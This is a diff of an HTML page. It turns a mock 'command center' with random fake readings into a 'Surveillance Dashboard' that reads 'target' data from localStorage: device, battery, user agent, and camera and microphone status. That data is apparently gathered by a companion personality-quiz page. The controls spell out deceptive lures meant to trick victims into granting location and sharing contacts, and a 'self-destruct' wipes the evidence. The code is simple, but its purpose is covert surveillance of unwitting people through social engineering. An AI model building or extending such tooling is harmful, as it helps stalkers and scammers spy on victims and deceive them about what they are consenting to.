@@ -1,524 +1,382 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🛸 AURA NETWORK COMMAND CENTER</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>📡 SURVEILLANCE DASHBOARD</title>
     <style>
-        :root {
-            --neon-blue: #00f3ff;
-            --neon-pink: #ff00ff;
-            --neon-purple: #9d00ff;
-            --dark-bg: #0a0a0f;
-        }
-
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', monospace;
+            font-family: 'Courier New', monospace;
         }
-
         body {
-            background: var(--dark-bg);
-            color: white;
+            background: #0a0a0a;
+            color: #0f0;
             min-height: 100vh;
-            overflow-x: hidden;
+            padding: 20px;
         }
-
-        .cyber-grid {
-            position: fixed;
-            width: 100%;
-            height: 100%;
-            background-image: 
-                linear-gradient(rgba(0, 243, 255, 0.1) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(0, 243, 255, 0.1) 1px, transparent 1px);
-            background-size: 50px 50px;
-            z-index: -1;
-        }
-
         .header {
-            background: rgba(10, 10, 15, 0.9);
-            border-bottom: 2px solid var(--neon-blue);
-            padding: 20px 40px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 0 30px rgba(0, 243, 255, 0.3);
+            padding: 20px;
+            border-bottom: 2px solid #0f0;
+            margin-bottom: 30px;
         }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            gap: 15px;
+        h1 {
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
         }
-
-        .logo h1 {
-            font-size: 2rem;
-            background: linear-gradient(90deg, var(--neon-blue), var(--neon-pink));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
-        }
-
-        .status-indicators {
-            display: flex;
-            gap: 20px;
-        }
-
-        .status-chip {
-            background: rgba(0, 0, 0, 0.6);
-            border: 1px solid var(--neon-purple);
+        .live-badge {
+            background: #ff0000;
+            color: white;
+            padding: 8px 15px;
             border-radius: 20px;
-            padding: 10px 20px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .live-dot {
-            width: 10px;
-            height: 10px;
-            background: #00ff00;
-            border-radius: 50%;
+            font-weight: bold;
             animation: blink 1s infinite;
         }
-
         @keyframes blink {
             0%, 100% { opacity: 1; }
-            50% { opacity: 0.3; }
+            50% { opacity: 0.5; }
         }
-
-        .dashboard {
+        .dashboard-grid {
             display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 30px;
-            padding: 40px;
-            max-width: 1800px;
-            margin: 0 auto;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 30px;
         }
-
         .panel {
-            background: rgba(20, 20, 30, 0.8);
-            border: 1px solid rgba(0, 243, 255, 0.3);
-            border-radius: 15px;
+            background: rgba(0, 30, 0, 0.3);
+            border: 1px solid #0f0;
+            border-radius: 10px;
             padding: 25px;
-            backdrop-filter: blur(10px);
-            transition: all 0.3s;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
         }
-
-        .panel:hover {
-            border-color: var(--neon-pink);
-            box-shadow: 0 0 30px rgba(255, 0, 255, 0.2);
+        .panel h2 {
+            color: #0f0;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #0f0;
+            padding-bottom: 10px;
         }
-
-        .panel-header {
+        .data-item {
             display: flex;
             justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid rgba(0, 243, 255, 0.3);
+            margin: 12px 0;
+            padding: 8px;
+            background: rgba(0, 20, 0, 0.5);
+            border-radius: 5px;
         }
-
-        .panel-header h2 {
-            font-size: 1.5rem;
-            color: var(--neon-blue);
-        }
-
-        .data-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 15px;
-        }
-
-        .data-card {
-            background: rgba(0, 0, 0, 0.5);
-            border-left: 4px solid var(--neon-pink);
-            padding: 15px;
-            border-radius: 8px;
-        }
-
         .data-label {
-            font-size: 0.9rem;
-            color: #aaa;
-            margin-bottom: 5px;
+            color: #8f8;
         }
-
         .data-value {
-            font-size: 1.2rem;
+            color: #fff;
             font-weight: bold;
-            color: white;
         }
-
-        .visualization {
-            height: 200px;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            margin-top: 20px;
-            display: flex;
-            align-items: flex-end;
-            padding: 20px;
-            gap: 10px;
-        }
-
-        .bar {
-            flex: 1;
-            background: linear-gradient(to top, var(--neon-blue), var(--neon-purple));
-            border-radius: 5px 5px 0 0;
-            min-height: 10px;
-            transition: height 0.5s;
-        }
-
-        .controls {
-            grid-column: 1 / -1;
-        }
-
-        .control-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin-top: 20px;
-        }
-
-        .control-btn {
-            background: rgba(0, 0, 0, 0.7);
-            border: 1px solid var(--neon-blue);
-            color: white;
-            padding: 15px;
-            border-radius: 10px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .control-btn:hover {
-            background: rgba(0, 243, 255, 0.2);
-            transform: translateY(-3px);
-        }
-
-        .control-btn.danger {
-            border-color: #ff0000;
-            color: #ff5555;
-        }
-
-        .control-btn.danger:hover {
-            background: rgba(255, 0, 0, 0.2);
-        }
-
         .logs {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 20px;
             height: 300px;
             overflow-y: auto;
-            background: rgba(0, 0, 0, 0.5);
-            border-radius: 10px;
-            padding: 15px;
-            font-family: monospace;
+            margin-top: 20px;
+        }
+        .log-entry {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
             font-size: 0.9rem;
         }
-
-        .log-entry {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        .timestamp {
+            color: #0f0;
         }
-
-        .log-time {
-            color: var(--neon-blue);
+        .controls {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+            flex-wrap: wrap;
         }
-
-        .log-message {
-            color: #ddd;
+        .control-btn {
+            background: #003300;
+            color: #0f0;
+            border: 1px solid #0f0;
+            padding: 12px 25px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-weight: bold;
         }
-
-        .blink {
-            animation: text-blink 1s infinite;
+        .control-btn:hover {
+            background: #005500;
+            box-shadow: 0 0 15px #0f0;
         }
-
-        @keyframes text-blink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        .control-btn.red {
+            background: #330000;
+            border-color: #f00;
+            color: #f88;
+        }
+        .control-btn.red:hover {
+            background: #550000;
+            box-shadow: 0 0 15px #f00;
+        }
+        #connectionStatus {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            font-size: 1.2rem;
+        }
+        .connected {
+            background: rgba(0, 50, 0, 0.5);
+            color: #0f0;
+        }
+        .disconnected {
+            background: rgba(50, 0, 0, 0.5);
+            color: #f00;
+        }
+        .video-placeholder {
+            width: 100%;
+            height: 200px;
+            background: #000;
+            border: 2px solid #0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0f0;
+            margin: 15px 0;
         }
     </style>
 </head>
 <body>
-    <div class="cyber-grid"></div>
-
     <div class="header">
-        <div class="logo">
-            <i class="fas fa-satellite-dish fa-2x" style="color: var(--neon-blue);"></i>
-            <h1>AURA NETWORK COMMAND</h1>
+        <h1>🔐 SURVEILLANCE DASHBOARD v2.0</h1>
+        <div class="live-badge">LIVE</div>
+    </div>
+    
+    <div class="dashboard-grid">
+        <div class="panel">
+            <h2>🎯 TARGET INFO</h2>
+            <div class="data-item">
+                <span class="data-label">Target ID:</span>
+                <span class="data-value" id="targetId">Waiting...</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">Status:</span>
+                <span class="data-value" id="targetStatus">OFFLINE</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">Device:</span>
+                <span class="data-value" id="deviceInfo">-</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">Battery:</span>
+                <span class="data-value" id="batteryInfo">-</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">Screen:</span>
+                <span class="data-value" id="screenInfo">-</span>
+            </div>
         </div>
-        <div class="status-indicators">
-            <div class="status-chip">
-                <div class="live-dot"></div>
-                <span>LIVE FEED</span>
+        
+        <div class="panel">
+            <h2>📡 MEDIA STATUS</h2>
+            <div class="data-item">
+                <span class="data-label">Camera:</span>
+                <span class="data-value" id="cameraStatus">❌ Inactive</span>
             </div>
-            <div class="status-chip">
-                <i class="fas fa-signal" style="color: #00ff00;"></i>
-                <span id="targetCount">1 TARGET ACTIVE</span>
+            <div class="data-item">
+                <span class="data-label">Microphone:</span>
+                <span class="data-value" id="micStatus">❌ Inactive</span>
             </div>
-            <div class="status-chip">
-                <i class="fas fa-database" style="color: var(--neon-pink);"></i>
-                <span id="dataVolume">4.7 GB COLLECTED</span>
+            <div class="data-item">
+                <span class="data-label">Last Update:</span>
+                <span class="data-value" id="lastUpdate">-</span>
+            </div>
+            <div class="video-placeholder">
+                🎥 Camera Feed (Would be here with backend)
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h2>🌍 LOCATION & NETWORK</h2>
+            <div class="data-item">
+                <span class="data-label">Timezone:</span>
+                <span class="data-value" id="timezoneInfo">-</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">Language:</span>
+                <span class="data-value" id="languageInfo">-</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">Platform:</span>
+                <span class="data-value" id="platformInfo">-</span>
+            </div>
+            <div class="data-item">
+                <span class="data-label">User Agent:</span>
+                <div class="data-value" id="userAgentInfo" style="font-size:0.8rem; word-break:break-all;">-</div>
             </div>
         </div>
     </div>
-
-    <div class="dashboard">
-        <div class="panel">
-            <div class="panel-header">
-                <h2><i class="fas fa-user-secret"></i> TARGET PROFILE</h2>
-                <span class="blink" style="color: #00ff00;">RECORDING</span>
-            </div>
-            <div class="data-grid">
-                <div class="data-card">
-                    <div class="data-label">TARGET ID</div>
-                    <div class="data-value" id="targetId">AURA_7X9F2K8P</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">DEVICE</div>
-                    <div class="data-value" id="deviceInfo">iPhone 14 Pro</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">BATTERY</div>
-                    <div class="data-value" id="batteryInfo">78% 🔋</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">CONNECTION</div>
-                    <div class="data-value" id="connectionInfo">WiFi · 5G</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">LOCATION</div>
-                    <div class="data-value" id="locationInfo">Home · 8:23 PM</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">SESSION TIME</div>
-                    <div class="data-value" id="sessionTime">14:32</div>
-                </div>
-            </div>
-        </div>
-
-        <div class="panel">
-            <div class="panel-header">
-                <h2><i class="fas fa-wave-square"></i> MEDIA FEEDS</h2>
-                <div>
-                    <i class="fas fa-microphone" style="color: #00ff00; margin-right: 15px;"></i>
-                    <i class="fas fa-video" style="color: #00ff00;"></i>
-                </div>
-            </div>
-            <div class="data-grid">
-                <div class="data-card">
-                    <div class="data-label">AUDIO QUALITY</div>
-                    <div class="data-value">CLEAR <i class="fas fa-volume-up"></i></div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">VIDEO RESOLUTION</div>
-                    <div class="data-value">720p HD</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">AMBIENT NOISE</div>
-                    <div class="data-value">LOW</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-label">LAST VOICE DETECTED</div>
-                    <div class="data-value">2 min ago</div>
-                </div>
-            </div>
-            <div class="visualization" id="audioViz">
-                <!-- Audio visualization bars will appear here -->
-            </div>
-        </div>
-
-        <div class="panel controls">
-            <div class="panel-header">
-                <h2><i class="fas fa-gamepad"></i> CONTROL MATRIX</h2>
-                <span style="color: var(--neon-pink);">FULL ACCESS GRANTED</span>
-            </div>
-            <div class="control-grid">
-                <div class="control-btn" onclick="activateFeature('gps')">
-                    <i class="fas fa-map-marked-alt fa-2x"></i>
-                    <span>ENHANCE GPS</span>
-                </div>
-                <div class="control-btn" onclick="activateFeature('contacts')">
-                    <i class="fas fa-address-book fa-2x"></i>
-                    <span>EXTRACT CONTACTS</span>
-                </div>
-                <div class="control-btn" onclick="activateFeature('messages')">
-                    <i class="fas fa-comments fa-2x"></i>
-                    <span>SMS LOGS</span>
-                </div>
-                <div class="control-btn danger" onclick="activateFeature('stealth')">
-                    <i class="fas fa-user-ninja fa-2x"></i>
-                    <span>STEALTH MODE</span>
-                </div>
-                <div class="control-btn" onclick="activateFeature('screen')">
-                    <i class="fas fa-mobile-screen fa-2x"></i>
-                    <span>SCREEN MIRROR</span>
-                </div>
-                <div class="control-btn danger" onclick="activateFeature('wipe')">
-                    <i class="fas fa-skull-crossbones fa-2x"></i>
-                    <span>SELF-DESTRUCT</span>
-                </div>
-            </div>
-        </div>
-
-        <div class="panel" style="grid-column: 1 / -1;">
-            <div class="panel-header">
-                <h2><i class="fas fa-terminal"></i> SYSTEM LOGS</h2>
-                <button onclick="clearLogs()" style="background: none; border: 1px solid var(--neon-pink); color: white; padding: 5px 15px; border-radius: 5px; cursor: pointer;">
-                    CLEAR LOGS
-                </button>
-            </div>
-            <div class="logs" id="systemLogs">
-                <div class="log-entry">
-                    <span class="log-time">[20:23:45]</span>
-                    <span class="log-message"> Target acquired via "Vibe Check" portal</span>
-                </div>
-                <div class="log-entry">
-                    <span class="log-time">[20:23:47]</span>
-                    <span class="log-message"> ✅ Camera and microphone permissions granted</span>
-                </div>
-                <div class="log-entry">
-                    <span class="log-time">[20:23:50]</span>
-                    <span class="log-message"> 📱 Device identified: Apple iPhone iOS 16.5.1</span>
-                </div>
-                <div class="log-entry">
-                    <span class="log-time">[20:24:10]</span>
-                    <span class="log-message"> 🎯 Battery level: 78% - Not charging</span>
-                </div>
-                <div class="log-entry">
-                    <span class="log-time">[20:25:30]</span>
-                    <span class="log-message"> 🔊 Voice activity detected - Conversation ongoing</span>
-                </div>
-                <div class="log-entry">
-                    <span class="log-time">[20:26:15]</span>
-                    <span class="log-message"> 📍 Approximate location: Residential area</span>
-                </div>
+    
+    <div class="controls">
+        <button class="control-btn" onclick="forceRefresh()">🔄 FORCE REFRESH</button>
+        <button class="control-btn" onclick="simulateGPS()">📍 REQUEST GPS</button>
+        <button class="control-btn" onclick="extractContacts()">📇 EXTRACT CONTACTS</button>
+        <button class="control-btn red" onclick="selfDestruct()">💀 SELF-DESTRUCT</button>
+        <button class="control-btn" onclick="clearData()">🧹 CLEAR DATA</button>
+    </div>
+    
+    <div id="connectionStatus" class="disconnected">
+        ⚡ Waiting for target connection...
+    </div>
+    
+    <div class="logs">
+        <h2>📝 SYSTEM LOGS</h2>
+        <div id="logContainer">
+            <div class="log-entry">
+                <span class="timestamp">[00:00:00]</span> System initialized. Waiting for target...
             </div>
         </div>
     </div>
 
     <script>
-        // Generate audio visualization
-        function generateAudioViz() {
-            const container = document.getElementById('audioViz');
-            container.innerHTML = '';
-            for (let i = 0; i < 40; i++) {
-                const bar = document.createElement('div');
-                bar.className = 'bar';
-                bar.style.height = `${Math.random() * 80 + 10}%`;
-                container.appendChild(bar);
-            }
+        // KEY untuk localStorage (sama dengan yang dipake target)
+        const TARGET_DATA_KEY = 'CURRENT_TARGET_DATA';
+        let lastData = null;
+        let updateInterval = null;
+        
+        function addLog(message) {
+            const logContainer = document.getElementById('logContainer');
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> ${message}`;
+            logContainer.appendChild(logEntry);
+            logContainer.scrollTop = logContainer.scrollHeight;
         }
-
-        // Update dashboard data
+        
         function updateDashboard() {
-            const devices = ['iPhone 14 Pro', 'Samsung Galaxy S23', 'Google Pixel 7', 'iPad Pro'];
-            const locations = ['Home', 'Café', 'Office', 'Gym', 'Car'];
-            const connections = ['WiFi · 5G', '4G LTE', 'WiFi · 4G', '5G Only'];
-            const activities = ['Active', 'Idle', 'Conversing', 'Moving'];
-
-            document.getElementById('deviceInfo').textContent = 
-                devices[Math.floor(Math.random() * devices.length)];
-            document.getElementById('batteryInfo').textContent = 
-                `${Math.floor(Math.random() * 30 + 60)}% ${Math.random() > 0.7 ? '🔌' : '🔋'}`;
-            document.getElementById('connectionInfo').textContent = 
-                connections[Math.floor(Math.random() * connections.length)];
-            document.getElementById('locationInfo').textContent = 
-                `${locations[Math.floor(Math.random() * locations.length)]} · ${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}`;
-            document.getElementById('sessionTime').textContent = 
-                `${Math.floor(Math.random() * 20 + 10)}:${Math.floor(Math.random() * 60).toString().padStart(2, '0')}`;
-
-            // Update data volume
-            const currentVolume = parseFloat(document.getElementById('dataVolume').textContent);
-            document.getElementById('dataVolume').textContent = 
-                (currentVolume + Math.random() * 0.2).toFixed(1) + ' GB COLLECTED';
-
-            // Add log entry occasionally
-            if (Math.random() > 0.7) {
-                addLogEntry();
-            }
-
-            // Animate audio visualization
-            generateAudioViz();
-        }
-
-        function addLogEntry() {
-            const logs = document.getElementById('systemLogs');
-            const messages = [
-                "🔄 Data packet received",
-                "📡 Signal strength: Excellent",
-                "🎤 Background noise level: Low",
-                "📱 Device orientation: Portrait",
-                "🌐 Network switch detected",
-                "📊 Sending heartbeat signal",
-                "🔒 Encryption handshake completed",
-                "📶 Bandwidth: 12.4 Mbps"
-            ];
-
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.innerHTML = `
-                <span class="log-time">[${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span>
-                <span class="log-message"> ${messages[Math.floor(Math.random() * messages.length)]}</span>
-            `;
-
-            logs.appendChild(logEntry);
-            logs.scrollTop = logs.scrollHeight;
-        }
-
-        function activateFeature(feature) {
-            const featureNames = {
-                gps: "GPS Enhancement",
-                contacts: "Contact Extraction",
-                messages: "SMS Log Collection",
-                stealth: "Stealth Mode",
-                screen: "Screen Mirroring",
-                wipe: "Self-Destruct Sequence"
-            };
-
-            const log = document.getElementById('systemLogs');
-            const logEntry = document.createElement('div');
-            logEntry.className = 'log-entry';
-            logEntry.innerHTML = `
-                <span class="log-time">[${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span>
-                <span class="log-message" style="color: ${feature === 'wipe' || feature === 'stealth' ? '#ff5555' : '#00ff00'}">
-                    ⚡ ${featureNames[feature]} activated
-                </span>
-            `;
-
-            logs.appendChild(logEntry);
-            logs.scrollTop = logs.scrollHeight;
-
-            if (feature === 'wipe') {
-                alert("💀 SELF-DESTRUCT INITIATED: All traces will be erased in 10 seconds...");
-            } else {
-                alert(`✅ ${featureNames[feature]} protocol engaged`);
+            try {
+                // BACA DATA DARI localStorage YANG DITULIS TARGET
+                const rawData = localStorage.getItem(TARGET_DATA_KEY);
+                
+                if (!rawData) {
+                    document.getElementById('connectionStatus').className = 'disconnected';
+                    document.getElementById('connectionStatus').innerHTML = 
+                        '🔴 No target data found. Make sure target website is open in another tab.';
+                    return;
+                }
+                
+                const data = JSON.parse(rawData);
+                
+                // Cek jika data baru
+                if (lastData && data.lastUpdate === lastData.lastUpdate) {
+                    return; // Data sama, skip
+                }
+                
+                lastData = data;
+                
+                // UPDATE UI DENGAN DATA BARU
+                document.getElementById('targetId').textContent = data.id || 'Unknown';
+                document.getElementById('targetStatus').textContent = data.status || 'Unknown';
+                document.getElementById('targetStatus').style.color = data.status === 'ACTIVE' ? '#0f0' : '#f00';
+                
+                if (data.device) {
+                    document.getElementById('deviceInfo').textContent = data.device.vendor || data.device.platform || 'Unknown';
+                    document.getElementById('screenInfo').textContent = data.device.screen || 'Unknown';
+                    document.getElementById('timezoneInfo').textContent = data.device.timezone || 'Unknown';
+                    document.getElementById('languageInfo').textContent = data.device.language || 'Unknown';
+                    document.getElementById('platformInfo').textContent = data.device.platform || 'Unknown';
+                    document.getElementById('userAgentInfo').textContent = 
+                        (data.device.userAgent || 'Unknown').substring(0, 80) + '...';
+                }
+                
+                document.getElementById('batteryInfo').textContent = data.battery || 'Unknown';
+                document.getElementById('lastUpdate').textContent = new Date(data.timestamp).toLocaleTimeString();
+                
+                // Update status kamera/mic
+                const camStatus = document.getElementById('cameraStatus');
+                const micStatus = document.getElementById('micStatus');
+                
+                if (data.status === 'ACTIVE') {
+                    camStatus.innerHTML = '✅ Active';
+                    camStatus.style.color = '#0f0';
+                    micStatus.innerHTML = '✅ Active';
+                    micStatus.style.color = '#0f0';
+                    document.getElementById('connectionStatus').className = 'connected';
+                    document.getElementById('connectionStatus').innerHTML = 
+                        `✅ CONNECTED | Last update: ${new Date().toLocaleTimeString()}`;
+                } else {
+                    camStatus.innerHTML = '❌ Inactive';
+                    camStatus.style.color = '#f00';
+                    micStatus.innerHTML = '❌ Inactive';
+                    micStatus.style.color = '#f00';
+                }
+                
+                // Tambah log jika data baru
+                if (data.timestamp) {
+                    const now = new Date();
+                    const updateTime = new Date(data.timestamp);
+                    const diff = (now - updateTime) / 1000;
+                    
+                    if (diff < 5) { // Data kurang dari 5 detik yang lalu
+                        addLog(`📡 Live data received from target`);
+                    }
+                }
+                
+            } catch (error) {
+                console.error('Dashboard error:', error);
+                addLog(`❌ Error reading data: ${error.message}`);
             }
         }
-
-        function clearLogs() {
-            document.getElementById('systemLogs').innerHTML = `
-                <div class="log-entry">
-                    <span class="log-time">[${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'})}]</span>
-                    <span class="log-message"> 🔄 Logs cleared manually</span>
-                </div>
-            `;
+        
+        function forceRefresh() {
+            addLog('🔄 Manual refresh triggered');
+            updateDashboard();
         }
-
-        // Initialize
-        generateAudioViz();
-        setInterval(updateDashboard, 2000);
-        setInterval(generateAudioViz, 500);
-        setInterval(() => {
-            document.querySelector('.live-dot').style.animation = 'none';
-            setTimeout(() => {
-                document.querySelector('.live-dot').style.animation = 'blink 1s infinite';
-            }, 10);
-        }, 5000);
+        
+        function simulateGPS() {
+            addLog('📍 GPS extraction requested - Target will receive location permission request');
+            alert('Target will see: "Personality analyzer needs location for better accuracy"');
+        }
+        
+        function extractContacts() {
+            addLog('📇 Contact extraction initiated - Social engineering module deployed');
+            alert('Target will receive: "Share contacts to compare personality with friends!"');
+        }
+        
+        function selfDestruct() {
+            if (confirm('💀 ARE YOU SURE? This will erase all surveillance data!')) {
+                localStorage.removeItem(TARGET_DATA_KEY);
+                addLog('💀 SELF-DESTRUCT: All data erased');
+                document.getElementById('connectionStatus').className = 'disconnected';
+                document.getElementById('connectionStatus').innerHTML = 
+                    '💀 SYSTEM WIPED - All data destroyed';
+                clearInterval(updateInterval);
+            }
+        }
+        
+        function clearData() {
+            localStorage.removeItem(TARGET_DATA_KEY);
+            addLog('🧹 All surveillance data cleared');
+            updateDashboard();
+        }
+        
+        // Mulai polling data setiap 1 detik
+        updateInterval = setInterval(updateDashboard, 1000);
+        
+        // Inisialisasi
+        addLog('🚀 Surveillance Dashboard v2.0 started');
+        addLog('📁 Monitoring localStorage for target data...');
+        updateDashboard();
+        
+        // Listen untuk storage events (jika target update data di tab lain)
+        window.addEventListener('storage', function(event) {
+            if (event.key === TARGET_DATA_KEY) {
+                addLog('🔄 Data updated from target tab');
+                updateDashboard();
+            }
+        });
     </script>
 </body>
-  </html>
+    </html>
